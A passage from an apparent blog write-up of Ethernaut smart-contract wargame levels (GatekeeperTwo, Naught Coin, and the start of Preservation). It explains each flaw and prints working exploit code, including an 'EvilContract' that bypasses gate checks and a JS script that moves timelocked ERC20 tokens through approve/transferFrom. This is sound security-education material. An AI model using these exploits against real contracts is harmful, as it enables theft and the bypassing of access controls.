<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span class="token" style="color:#6a9955">// retrieve the size of the code, this needs assembly</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span><span>            </span><span class="token" style="color:#569CD6">let</span><span> </span><span class="token literal-property" style="color:#9cdcfe">size</span><span> </span><span class="token" style="color:#d4d4d4">:</span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">extcodesize</span><span class="token" style="color:#d4d4d4">(</span><span>addr</span><span class="token" style="color:#d4d4d4">)</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">3</span>
</span></code></div></pre>
<p class="chakra-text css-0" node="[object Object]">For the <code class="inline-code">caller()</code> it returns the address of the caller. it might be an account or another contract. Actually, this <code class="inline-code">consensys</code> which a great resource for smart contract security explains it all .</p>
<blockquote>
<p class="chakra-text css-0" node="[object Object]">the idea is straightforward: if an address contains code, it&#x27;s not an EOA but a contract account. However, a contract does not have source code available during construction. This means that while the constructor is running, it can make calls to other contracts, but extcodesize for its address returns zero.</p>
</blockquote>
<p class="chakra-text css-0" node="[object Object]"><a class="chakra-link css-9olwc6" href="https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/extcodesize-checks/">Consensys Page</a></p>
<p class="chakra-text css-0" node="[object Object]">So we now know to pass this gate we need to call the method <code class="inline-code">enter</code> in the constructor of our <em>EvilContract</em></p>
<style data-emotion="css xm64py">.css-xm64py{font-family:Sen;font-weight:var(--chakra-fontWeights-bold);font-size:40px;line-height:1.33;color:#6d6875;margin-top:var(--chakra-space-10);margin-bottom:var(--chakra-space-6);}@media screen and (min-width: 48em){.css-xm64py{line-height:1.2;}}</style><h3 class="chakra-heading css-xm64py" id="gatethree">gateThree</h3>
<p class="chakra-text css-0" node="[object Object]">This gate resembles gateThree of <em>GateKeeper One</em> it&#x27;s about performing the right logical operations and finding the gateKey.</p>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span> modifier </span><span class="token" style="color:#dcdcaa">gateThree</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">bytes8 _gateKey</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span><span>    </span><span class="token" style="color:#dcdcaa">require</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">uint64</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">bytes8</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">keccak256</span><span class="token" style="color:#d4d4d4">(</span><span>abi</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">encodePacked</span><span class="token" style="color:#d4d4d4">(</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">sender</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span> </span><span class="token" style="color:#dcdcaa">uint64</span><span class="token" style="color:#d4d4d4">(</span><span>_gateKey</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">==</span><span> </span><span class="token" style="color:#dcdcaa">uint64</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">-</span><span> </span><span class="token" style="color:#b5cea8">1</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">3</span><span>    _</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">4</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">5</span>
</span></code></div></pre>
<p class="chakra-text css-0" node="[object Object]">Let&#x27;s evalulate the <em>right</em> side of the equality. Remember the <em>Token</em> Challenge ? yes but now this dangerous manipulation of unsigned integer in intended and it gives us the value <code class="inline-code">0xFFFFFFFF</code>.
For the <em>left</em> side of the equality we got an <span class="chakra-text css-gv9qss">XOR</span> operation. <span class="chakra-text css-gv9qss">XOR</span> verifies if the bits in the same position or not if they are it results in 1 otherwise in 0. Let&#x27;s ignore the conversion it won&#x27;t change anything actually because we can reverse it to get the _gateKey later.</p>
<p class="chakra-text css-0" node="[object Object]">So the equation we have :</p>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">A</span> =  <code class="inline-code">uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))</code>
<span class="chakra-text css-gv9qss">B</span> = <code class="inline-code">uint64(_gateKey)</code>
<span class="chakra-text css-gv9qss">C</span> = <code class="inline-code">uint64(0) - 1</code></p>
<p class="chakra-text css-0" node="[object Object]">Here is what we need to do ! Read carefully this wikipedia page if you need to understand how it works on bit level. <a class="chakra-link css-9olwc6" href="https://en.wikipedia.org/wiki/XOR_cipher">Wikipidea XOR Article</a>
<div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138010/01a9f0d0791a8896c4b6109abc576acbfbccade8b44817fa1abd2f245eb99700_lii5bn.png" alt="XOR Wikipedia Screenshot" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">XOR Wikipedia Screenshot</p></div></div></p>
<p class="chakra-text css-0" node="[object Object]"><code class="inline-code">A ^ B = C , B = ? ==&gt; B = A ^ C</code>
Which translates to
<code class="inline-code">gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(0) - 1);</code></p>
<div class="css-17l36zw"></div>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Exploitation</span></p>
<p class="chakra-text css-0" node="[object Object]">Let&#x27;s craft our <em>EvilContract</em></p>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span>contract </span><span class="token" style="color:#4ec9b0">EvilContract</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span> 
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">3</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">getOperationResult</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> pure </span><span class="token" style="color:#dcdcaa">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">uint64</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">4</span><span>        uint64 x </span><span class="token" style="color:#d4d4d4">=</span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">;</span><span> 
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">5</span><span>        </span><span class="token" style="color:#c586c0">return</span><span> x </span><span class="token" style="color:#d4d4d4">-</span><span> </span><span class="token" style="color:#b5cea8">1</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">6</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">7</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">8</span><span>   </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">getGateKey</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> view </span><span class="token" style="color:#dcdcaa">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">bytes8</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">{</span><span> 
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">9</span><span>       uint64 x </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">getOperationResult</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">10</span><span>     </span><span class="token" style="color:#c586c0">return</span><span>   </span><span class="token" style="color:#dcdcaa">bytes8</span><span class="token" style="color:#d4d4d4">(</span><span>x </span><span class="token" style="color:#d4d4d4">^</span><span> </span><span class="token" style="color:#dcdcaa">uint64</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">bytes8</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">keccak256</span><span class="token" style="color:#d4d4d4">(</span><span>abi</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">encodePacked</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">11</span><span>   </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">12</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">13</span>   
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">14</span><span>   </span><span class="token" style="color:#dcdcaa">constructor</span><span class="token" style="color:#d4d4d4">(</span><span>address gateAddress</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">15</span><span>       </span><span class="token" style="color:#4ec9b0">GateTwo</span><span> gateTwoContract</span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">GateTwo</span><span class="token" style="color:#d4d4d4">(</span><span>gateAddress</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">16</span><span>       bytes8  gateKey </span><span class="token" style="color:#d4d4d4">=</span><span class="token" style="color:#dcdcaa">getGateKey</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">17</span><span>      bool state</span><span class="token" style="color:#d4d4d4">=</span><span> gateTwoContract</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">enter</span><span class="token" style="color:#d4d4d4">(</span><span>gateKey</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">18</span><span>     </span><span class="token" style="color:#dcdcaa">require</span><span class="token" style="color:#d4d4d4">(</span><span>state</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">19</span><span>   </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">20</span>   
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">21</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">22</span>
</span></code></div></pre>
<p class="chakra-text css-0" node="[object Object]">We pass our instance address to the constructor.</p>
<p class="chakra-text css-0" node="[object Object]">Challenge solved ✅</p>
<blockquote>
<p class="chakra-text css-0" node="[object Object]">I was late, I couldn&#x27;t join theCyber club 🥲</p>
</blockquote>
<h2 class="chakra-heading css-1uc67dn" id="naught coin">Naught Coin</h2>
<blockquote>
<p class="chakra-text css-0" node="[object Object]">RTFM</p>
</blockquote>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Challenge description</span></p>
<p class="chakra-text css-0" node="[object Object]">NaughtCoin is an ERC20 token and you&#x27;re already holding all of them. The catch is that you&#x27;ll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.
~ A bunch of useful references we will be going through in analysis</p>
<div class="css-17l36zw"></div>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Analysis</span></p>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138024/264f925aeaf5e08d9758746a1f9774a6a2194df257f8dd0a92a00b4b820881d7_dm5hut.png" alt="Naught Coin contract" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">Naught Coin contract</p></div></div></p>
<p class="chakra-text css-0" node="[object Object]">The contract is an implementation of the ERC20 specification.</p>
<p class="chakra-text css-0" node="[object Object]"><em>How it works ?</em>
We create tokens that can be traded between the users of our contract. Our contract is responsible for setting the total supply and modifying it, keeping track of users balance and one other useful feature allowing and disallowing the ones who can spend/trade tokens from each account remember that it will be useful.</p>
<p class="chakra-text css-0" node="[object Object]">The logic is flawless and the condition cannot be bypassed.</p>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span>      </span><span class="token" style="color:#dcdcaa">require</span><span class="token" style="color:#d4d4d4">(</span><span>now </span><span class="token" style="color:#d4d4d4">&gt;</span><span> timeLock</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span>
</span></code></div></pre>
<p class="chakra-text css-0" node="[object Object]">But our contract is inheriting from the ERC20 of openzeppelin and we can see something is wrong.</p>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138012/1ec4088e0ffadccfa057b1c022c8d4fb51d1475ef0e0018a4e32b7b1beab92e0_iagggl.png" alt="ERC20 openzeppeling" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">ERC20 openzeppeling</p></div></div></p>
<p class="chakra-text css-0" node="[object Object]">We got another method for transferring tokens ! cool but wait <em>he caller must have allowance for <code class="inline-code">from</code>&#x27;s tokens of at least amount</em> so msg.sender needs to have an allowance of the amount.
and allowance can be set by calling..</p>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138018/47b72aa9c7060cd02c197e1de9e50fb4f53f3b5a7d7e6e9f0c946807ec700df9_gsugja.png" alt="ERC20 openzeppelin" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">ERC20 openzeppelin</p></div></div></p>
<p class="chakra-text css-0" node="[object Object]">Okay we got everything let&#x27;s -----
<span class="chakra-text css-gv9qss">Exploitation</span> it</p>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Further Reading</span> <a class="chakra-link css-9olwc6" href="https://docs.google.com/document/d/1YLPtQxZu1UAvO9cZ1O2RPXBbT0mooh4DYKjA_jp-RLM/edit#">ERC20 API: An Attack Vector on Approve/TransferFrom Methods</a></p>
<div class="css-17l36zw"></div>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Exploitation</span></p>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span class="token" style="color:#569CD6">const</span><span> balance </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#c586c0">await</span><span> contract</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">balanceOf</span><span class="token" style="color:#d4d4d4">(</span><span>player</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">toString</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span><span></span><span class="token" style="color:#c586c0">await</span><span> contract</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">approve</span><span class="token" style="color:#d4d4d4">(</span><span>player</span><span class="token" style="color:#d4d4d4">,</span><span>balance</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">3</span><span></span><span class="token" style="color:#c586c0">await</span><span> contract</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">transferFrom</span><span class="token" style="color:#d4d4d4">(</span><span>player</span><span class="token" style="color:#d4d4d4">,</span><span class="token" style="color:#9cdcfe">ANY_OTHER_ADDRESS</span><span class="token" style="color:#d4d4d4">,</span><span>balance</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">4</span>
</span></code></div></pre>
<p class="chakra-text css-0" node="[object Object]">Challenge solved ✅</p>
<h2 class="chakra-heading css-1uc67dn" id="perservation">Perservation</h2>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Challenge description</span></p>
<p class="chakra-text css-0" node="[object Object]">This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.
The goal of this level is for you to claim ownership of the instance you are given.</p>
<div class="css-17l36zw"></div>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Analysis</span></p>
<p class="chakra-text css-0" node="[object Object]">I explained well the <code class="inline-code">delegateCall</code> function before and how it runs in the caller context but I left the context a little blurry so let&#x27;s define it.
The context here is the storage variables or let me call them <code class="inline-code">state variables</code> they are defined in the contract address and the called contract will handle them <em>blindly</em> which means he will assume that</p>
<p class="chakra-text css-0" node="[object Object]"><em>Storage layout of the caller</em>  == <em>Storage layout of the callee</em></p>
<p class="chakra-text css-0" node="[object Object]">Let&#x27;s look to our contract now.</p>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138010/0cded2638e39c98dee9e35690675e5a299c3628f81c9bdb1375a708b5e209098_ecu1g4.png" alt="Perservation contract" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">Perservation contract</p></div></div></p>
<p class="chakra-text css-0" node="[object Object]">The interesting bits are :</p>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span>  </span><span class="token" style="color:#6a9955">//inside the library contract</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span><span>  uint storedTime</span><span class="token" style="color:#d4d4d4">;</span><span>  
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">3</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">4</span><span>   </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">setTime</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">uint _time</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">5</span><span>    storedTime </span><span class="token" style="color:#d4d4d4">=</span><span> _time</span><span class="token" style="color:#d4d4d4">;</span><span>
